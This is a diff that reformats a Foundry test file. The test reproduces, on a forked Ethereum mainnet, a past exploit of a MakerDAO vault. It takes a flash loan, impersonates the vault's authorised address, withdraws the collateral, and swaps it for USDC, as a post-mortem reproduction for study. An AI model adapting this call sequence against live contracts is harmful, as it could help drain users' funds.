@@ -14,8 +14,8 @@ import "../basetest.sol";
 
 // @Analysis
 // Post-mortem : https://app.blocksec.com/explorer/tx/eth/0xa4e650772f6e6b7ecc0964fe4c3854850669d1467570a2fa2b6edfa0f112c4b7
-// Twitter Guy : 
-// Hacking God : 
+// Twitter Guy :
+// Hacking God :
 pragma solidity ^0.8.0;
 
 import "forge-std/Test.sol";
@@ -26,31 +26,40 @@ interface IMakerPool {
 }
 
 struct Urn {
-    uint256 ink;   // Locked Collateral  [wad]
-    uint256 art;   // Normalised Debt    [wad]
+    uint256 ink; // Locked Collateral  [wad]
+    uint256 art; // Normalised Debt    [wad]
 }
 
 struct Ilk {
-        uint256 Art;   // Total Normalised Debt     [wad]
-        uint256 rate;  // Accumulated Rates         [ray]
-        uint256 spot;  // Price with Safety Margin  [ray]
-        uint256 line;  // Debt Ceiling              [rad]
-        uint256 dust;  // Urn Debt Floor            [rad]
-    }
+    uint256 Art; // Total Normalised Debt     [wad]
+    uint256 rate; // Accumulated Rates         [ray]
+    uint256 spot; // Price with Safety Margin  [ray]
+    uint256 line; // Debt Ceiling              [rad]
+    uint256 dust; // Urn Debt Floor            [rad]
+}
 
 interface IMakerVat {
     function urns(bytes32, address) external view returns (Urn memory);
-    function hope(address) external;
-    function heal(uint256) external;
-    function ilks(bytes32) external view returns (Ilk memory);
+    function hope(
+        address
+    ) external;
+    function heal(
+        uint256
+    ) external;
+    function ilks(
+        bytes32
+    ) external view returns (Ilk memory);
 }
+
 interface IMakerManager {
-    function urns(uint) external view returns (address);
-    function join(address, uint) external;
-    function flux(uint, address, uint) external;
-    function frob(uint, int, int) external;
-    function open(bytes32, address) external returns (uint);
-    function cdpAllow(uint, address, uint) external;
+    function urns(
+        uint256
+    ) external view returns (address);
+    function join(address, uint256) external;
+    function flux(uint256, address, uint256) external;
+    function frob(uint256, int256, int256) external;
+    function open(bytes32, address) external returns (uint256);
+    function cdpAllow(uint256, address, uint256) external;
 }
 
 interface IUniv2 {
@@ -58,7 +67,9 @@ interface IUniv2 {
 }
 
 interface IUniv2Token {
-    function burn(address) external returns (uint, uint);
+    function burn(
+        address
+    ) external returns (uint256, uint256);
 }
 
 interface Mcd {
@@ -85,14 +96,16 @@ contract Circle is BaseTestWithBalanceLog {
     CheatCodes cheats = CheatCodes(0x7109709ECfa91a80626fF3989D68f67F5b1DD12D);
 
     function setUp() public {
-        cheats.createSelectFork("mainnet", 15_331_020-1);
+        cheats.createSelectFork("mainnet", 15_331_020 - 1);
     }
 
-
     function testExploit() public {
-        emit log_named_decimal_uint("[Begin] Attacker Circle before exploit", IERC20(circle).balanceOf(address(this)), 6);
-        uint256 amount = 2437926935218598618037988;
-        bytes memory data = "0x0000000000000000000000000000000000000000000000000000000000006e970000000000000000000000000000000000000000000000000000000000000000";
+        emit log_named_decimal_uint(
+            "[Begin] Attacker Circle before exploit", IERC20(circle).balanceOf(address(this)), 6
+        );
+        uint256 amount = 2_437_926_935_218_598_618_037_988;
+        bytes memory data =
+            "0x0000000000000000000000000000000000000000000000000000000000006e970000000000000000000000000000000000000000000000000000000000000000";
         IMakerPool(maker).flashLoan(address(this), dai, amount, data);
         emit log_named_decimal_uint("[End] Attacker Circle after exploit", IERC20(circle).balanceOf(address(this)), 6);
     }
@@ -104,11 +117,14 @@ contract Circle is BaseTestWithBalanceLog {
         uint256 fee,
         bytes calldata data
     ) external returns (bytes32) {
-        address urns_address = IMakerManager(maker_cdp_manager).urns(28311);
-        Urn memory urn = IMakerVat(make_mcd_vat).urns(0x554e495632444149555344432d41000000000000000000000000000000000000,urns_address);
+        address urns_address = IMakerManager(maker_cdp_manager).urns(28_311);
+        Urn memory urn = IMakerVat(make_mcd_vat).urns(
+            0x554e495632444149555344432d41000000000000000000000000000000000000, urns_address
+        );
 
-        Ilk memory ilk = IMakerVat(make_mcd_vat).ilks(0x554e495632444149555344432d41000000000000000000000000000000000000);
-        
+        Ilk memory ilk =
+            IMakerVat(make_mcd_vat).ilks(0x554e495632444149555344432d41000000000000000000000000000000000000);
+
         uint256 amount_dai = IERC20(dai).balanceOf(address(this));
         IERC20(dai).approve(maker_mcd_join_dai, amount_dai);
 
@@ -117,16 +133,16 @@ contract Circle is BaseTestWithBalanceLog {
         cheats.prank(0xfd51531b26f9Be08240f7459Eea5BE80D5B047D9); // borrow the authority of cdp 28311 (assigned before)
         // dink = 0-urn.ink/4 = -1104761777152681125
         // dart = 0-urn.art/4 = -2419153952397280665329975
-        IMakerManager(maker_cdp_manager).frob(28311, -1104761777152681125, -2419153952397280665329975);
+        IMakerManager(maker_cdp_manager).frob(28_311, -1_104_761_777_152_681_125, -2_419_153_952_397_280_665_329_975);
         cheats.prank(0xfd51531b26f9Be08240f7459Eea5BE80D5B047D9);
-        IMakerManager(maker_cdp_manager).flux(28311, address(this), 1104761777152681125);
-        IUniv2(univ2).exit(address(this), 1104761777152681125);
+        IMakerManager(maker_cdp_manager).flux(28_311, address(this), 1_104_761_777_152_681_125);
+        IUniv2(univ2).exit(address(this), 1_104_761_777_152_681_125);
 
-        IERC20(univ2_token).transfer(univ2_token, 1104761777152681125);
-        (uint amount0, uint amount1) = IUniv2Token(univ2_token).burn(address(this));
+        IERC20(univ2_token).transfer(univ2_token, 1_104_761_777_152_681_125);
+        (uint256 amount0, uint256 amount1) = IUniv2Token(univ2_token).burn(address(this));
 
         IERC20(circle).approve(allower, type(uint256).max);
-        Mcd(mcd).sellGem(address(this), 1193139061611);
+        Mcd(mcd).sellGem(address(this), 1_193_139_061_611);
         IERC20(dai).approve(maker, type(uint256).max);
         return 0x439148f0bbc682ca079e46d6e2c2f0c1e3b820f1a291b069d8882abf8cf18dd9;
     }
